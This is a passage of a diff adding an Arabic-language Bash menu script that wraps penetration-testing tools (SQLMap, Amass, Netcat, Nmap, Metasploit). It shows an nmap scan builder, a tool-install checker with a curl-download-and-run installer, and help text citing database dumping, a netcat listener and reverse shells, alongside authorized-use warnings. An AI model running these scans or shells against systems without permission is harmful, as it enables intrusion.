+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="nmap -sC $TARGET"
+                execute_command "$CMD"
+                ;;
+            13)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                echo -e "${YELLOW}اختر السرعة:${NC}"
+                echo -e "${CYAN}[0] T0 Paranoid  [1] T1 Sneaky  [2] T2 Polite${NC}"
+                echo -e "${CYAN}[3] T3 Normal    [4] T4 Aggressive  [5] T5 Insane${NC}"
+                read_input "الرقم" TIMING
+                CMD="nmap -T$TIMING $TARGET"
+                execute_command "$CMD"
+                ;;
+            14)
+                read_input "أدخل الشبكة (مثل: 192.168.1.0/24)" TARGET
+                CMD="nmap -sn $TARGET"
+                execute_command "$CMD"
+                ;;
+            15)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="nmap -sn $TARGET"
+                execute_command "$CMD"
+                ;;
+            16)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                read_input "نوع الفحص (sS/sT/sU/sV/O/A)" SCAN_TYPE
+                read_input "المنافذ (اتركه فارغ للافتراضي)" PORTS
+                read_input "السرعة T0-T5 (اتركه فارغ للافتراضي)" TIMING
+                read_input "NSE Scripts (مثل: vuln,auth)" SCRIPTS
+                read_input "ملف الإخراج (اتركه فارغ لعدم الحفظ)" OUTPUT
+                
+                CMD="nmap"
+                [ ! -z "$SCAN_TYPE" ] && CMD="$CMD -s$SCAN_TYPE"
+                [ ! -z "$PORTS" ] && CMD="$CMD -p $PORTS"
+                [ ! -z "$TIMING" ] && CMD="$CMD -T$TIMING"
+                [ ! -z "$SCRIPTS" ] && CMD="$CMD --script $SCRIPTS"
+                [ ! -z "$OUTPUT" ] && CMD="$CMD -oA $OUTPUT"
+                CMD="$CMD $TARGET"
+                
+                execute_command "$CMD"
+                ;;
+            0)
+                return
+                ;;
+            *)
+                echo -e "${RED}خيار غير صحيح!${NC}"
+                sleep 1
+                ;;
+        esac
+    done
+}
+
+# ═══════════════════════════════════════════════════════════
+# القائمة الرئيسية
+# ═══════════════════════════════════════════════════════════
+main_menu() {
+    while true; do
+        header
+        echo -e "${WHITE}╔═══════════════════════════════════════════════════════════╗${NC}"
+        echo -e "${WHITE}║${GREEN}                    القائمة الرئيسية                       ${WHITE}║${NC}"
+        echo -e "${WHITE}╚═══════════════════════════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "${RED}  [1] SQLMap    ${NC}- فحص ثغرات SQL Injection"
+        echo -e "${BLUE}  [2] Amass     ${NC}- استكشاف النطاقات الفرعية"
+        echo -e "${GREEN}  [3] Netcat    ${NC}- أداة الشبكات متعددة الاستخدامات"
+        echo -e "${PURPLE}  [4] Nmap      ${NC}- فحص المنافذ والشبكات"
+        echo -e "${YELLOW}  [5] Metasploit${NC}- إطار العمل الشامل للاستغلال"
+        echo ""
+        echo -e "${YELLOW}  [6] تحقق من تثبيت الأدوات${NC}"
+        echo -e "${CYAN}  [7] معلومات وتعليمات${NC}"
+        echo -e "${RED}  [0] خروج${NC}"
+        echo ""
+        echo -ne "${GREEN}اختر رقم الأداة: ${NC}"
+        read choice
+        
+        case $choice in
+            1) sqlmap_menu ;;
+            2) amass_menu ;;
+            3) netcat_menu ;;
+            4) nmap_menu ;;
+            5) metasploit_menu ;;
+            6) check_tools ;;
+            7) show_help ;;
+            0) 
+                echo -e "${CYAN}شكراً لاستخدام الأداة!${NC}"
+                exit 0
+                ;;
+            *)
+                echo -e "${RED}خيار غير صحيح!${NC}"
+                sleep 1
+                ;;
+        esac
+    done
+}
+
+# دالة التحقق من تثبيت الأدوات
+check_tools() {
+    header
+    echo -e "${YELLOW}╔═══════════════════════════════════════╗${NC}"
+    echo -e "${YELLOW}║${WHITE}      التحقق من تثبيت الأدوات         ${YELLOW}║${NC}"
+    echo -e "${YELLOW}╚═══════════════════════════════════════╝${NC}"
+    echo ""
+    
+    # التحقق من SQLMap
+    if command -v sqlmap &> /dev/null; then
+        echo -e "${GREEN}✓ SQLMap مثبت${NC}"
+        sqlmap --version 2>/dev/null | head -1
+    else
+        echo -e "${RED}✗ SQLMap غير مثبت${NC}"
+        echo -e "${CYAN}  للتثبيت: git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git${NC}"
+    fi
+    echo ""
+    
+    # التحقق من Amass
+    if command -v amass &> /dev/null; then
+        echo -e "${GREEN}✓ Amass مثبت${NC}"
+        amass -version 2>/dev/null
+    else
+        echo -e "${RED}✗ Amass غير مثبت${NC}"
+        echo -e "${CYAN}  للتثبيت: sudo apt install amass${NC}"
+    fi
+    echo ""
+    
+    # التحقق من Netcat
+    if command -v nc &> /dev/null; then
+        echo -e "${GREEN}✓ Netcat مثبت${NC}"
+        nc -h 2>&1 | head -1
+    else
+        echo -e "${RED}✗ Netcat غير مثبت${NC}"
+        echo -e "${CYAN}  للتثبيت: sudo apt install netcat${NC}"
+    fi
+    echo ""
+    
+    # التحقق من Nmap
+    if command -v nmap &> /dev/null; then
+        echo -e "${GREEN}✓ Nmap مثبت${NC}"
+        nmap --version | head -1
+    else
+        echo -e "${RED}✗ Nmap غير مثبت${NC}"
+        echo -e "${CYAN}  للتثبيت: sudo apt install nmap${NC}"
+    fi
+    echo ""
+    
+    # التحقق من Metasploit
+    if command -v msfconsole &> /dev/null; then
+        echo -e "${GREEN}✓ Metasploit مثبت${NC}"
+        msfconsole --version 2>/dev/null || echo "Metasploit Framework موجود"
+    else
+        echo -e "${RED}✗ Metasploit غير مثبت${NC}"
+        echo -e "${CYAN}  للتثبيت: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall${NC}"
+    fi
+    echo ""
+    
+    # التحقق من Msfvenom
+    if command -v msfvenom &> /dev/null; then
+        echo -e "${GREEN}✓ Msfvenom مثبت${NC}"
+    else
+        echo -e "${RED}✗ Msfvenom غير مثبت${NC}"
+    fi
+    echo ""
+    
+    echo -e "${PURPLE}اضغط Enter للعودة...${NC}"
+    read
+}
+
+# دالة عرض المساعدة والمعلومات
+show_help() {
+    header
+    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${CYAN}║${WHITE}                 معلومات وتعليمات الاستخدام                ${CYAN}║${NC}"
+    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+    
+    echo -e "${YELLOW}═══ SQLMap ═══${NC}"
+    echo -e "${WHITE}أداة اختبار أمان تلقائية لكشف واستغلال ثغرات SQL Injection${NC}"
+    echo -e "${CYAN}• استخدمها لفحص تطبيقات الويب${NC}"
+    echo -e "${CYAN}• يمكنها استخراج قواعد البيانات والجداول والبيانات${NC}"
+    echo -e "${CYAN}• مثال: sqlmap -u 'http://site.com/page?id=1' --dbs${NC}"
+    echo ""
+    
+    echo -e "${YELLOW}═══ Amass ═══${NC}"
+    echo -e "${WHITE}أداة استكشاف النطاقات الفرعية وجمع المعلومات${NC}"
+    echo -e "${CYAN}• يكتشف النطاقات الفرعية المخفية${NC}"
+    echo -e "${CYAN}• يستخدم مصادر متعددة (DNS, Certificates, APIs)${NC}"
+    echo -e "${CYAN}• مثال: amass enum -passive -d target.com${NC}"
+    echo ""
+    
+    echo -e "${YELLOW}═══ Netcat ═══${NC}"
+    echo -e "${WHITE}أداة شبكات متعددة الاستخدامات (Swiss Army Knife)${NC}"
+    echo -e "${CYAN}• نقل الملفات بين الأجهزة${NC}"
+    echo -e "${CYAN}• فحص المنافذ المفتوحة${NC}"
+    echo -e "${CYAN}• إنشاء Reverse/Bind Shells${NC}"
+    echo -e "${CYAN}• مثال: nc -lvp 4444 (استماع على منفذ)${NC}"
+    echo ""
+    
+    echo -e "${YELLOW}═══ Nmap ═══${NC}"
+    echo -e "${WHITE}أداة فحص الشبكات واكتشاف الأجهزة والخدمات${NC}"
+    echo -e "${CYAN}• فحص المنافذ المفتوحة${NC}"
+    echo -e "${CYAN}• كشف أنظمة التشغيل والخدمات${NC}"
+    echo -e "${CYAN}• اكتشاف الثغرات باستخدام NSE Scripts${NC}"
+    echo -e "${CYAN}• مثال: nmap -A -T4 192.168.1.1${NC}"
+    echo ""
+    
+    echo -e "${YELLOW}═══ Metasploit ═══${NC}"
+    echo -e "${WHITE}إطار عمل شامل لتطوير وتنفيذ واستغلال الثغرات${NC}"
+    echo -e "${CYAN}• إنشاء وتنفيذ Payloads${NC}"
+    echo -e "${CYAN}• Post-Exploitation Modules${NC}"
+    echo -e "${CYAN}• إدارة الجلسات عن بعد${NC}"
+    echo -e "${CYAN}• مثال: msfconsole -q -x 'use exploit/...; set RHOST...; exploit'${NC}"
+    echo ""
+    
+    echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${RED}║${WHITE}                      ⚠️ تحذيرات قانونية ⚠️                  ${RED}║${NC}"
+    echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
+    echo -e "${YELLOW}• استخدم هذه الأدوات فقط على أنظمة لديك إذن باختبارها${NC}"
+    echo -e "${YELLOW}• الاستخدام غير المصرح به يعتبر جريمة إلكترونية${NC}"
+    echo -e "${YELLOW}• احصل دائماً على إذن كتابي قبل اختبار أي نظام${NC}"
+    echo -e "${YELLOW}• المطور غير مسؤول عن أي استخدام خاطئ${NC}"
+    echo ""
+    
+    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║${WHITE}                     نصائح للاستخدام الآمن                   ${GREEN}║${NC}"
+    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
+    echo -e "${CYAN}1. استخدم VPN أو بيئة معزولة عند الاختبار${NC}"
+    echo -e "${CYAN}2. احفظ جميع نتائج الفحوصات للتوثيق${NC}"
+    echo -e "${CYAN}3. ابدأ بالفحوصات السلبية قبل النشطة${NC}"
+    echo -e "${CYAN}4. راقب سرعة الفحص لتجنب إغراق الهدف${NC}"
+    echo -e "${CYAN}5. تأكد من فهمك للأوامر قبل تنفيذها${NC}"
+    echo -e "${CYAN}6. استخدم Resource Files (.rc) في Metasploit للأتمتة${NC}"
+    echo ""
+    
+    echo -e "${PURPLE}اضغط Enter للعودة للقائمة الرئيسية...${NC}"
+    read
+}
+
+# ═══════════════════════════════════════════════════════════
+# بدء البرنامج
+# ═══════════════════════════════════════════════════════════
+
+# التحقق من وجود صلاحيات
+if [[ $EUID -ne 0 ]]; then
+   echo -e "${YELLOW}تنبيه: بعض الأوامر تحتاج صلاحيات root${NC}"
+   echo -e "${YELLOW}يمكنك تشغيل السكريبت بـ: sudo $0${NC}"
+   echo ""
+   sleep 2
+fi
+
+# التحقق من الاتصال بالإنترنت (اختياري)
+if ! ping -c 1 8.8.8.8 &> /dev/null; then
+    echo -e "${RED}تحذير: لا يوجد اتصال بالإنترنت${NC}"
+    echo -e "${YELLOW}بعض الأدوات قد لا تعمل بشكل صحيح${NC}"
+    sleep 2
+fi
+
+# عرض شاشة الترحيب
+header
+echo -e "${GREEN}مرحباً بك في مجموعة أدوات الاختبار الأمني${NC}"
+echo -e "${CYAN}هذا السكريبت يوفر واجهة سهلة لاستخدام أدوات الاختراق الأخلاقي${NC}"
+echo ""
+echo -e "${YELLOW}⚠️  استخدم هذه الأدوات بشكل قانوني وأخلاقي فقط${NC}"
+echo ""
+echo -e "${PURPLE}اضغط Enter للبدء...${NC}"
+read
+
+# تشغيل القائمة الرئيسية
+main_menu
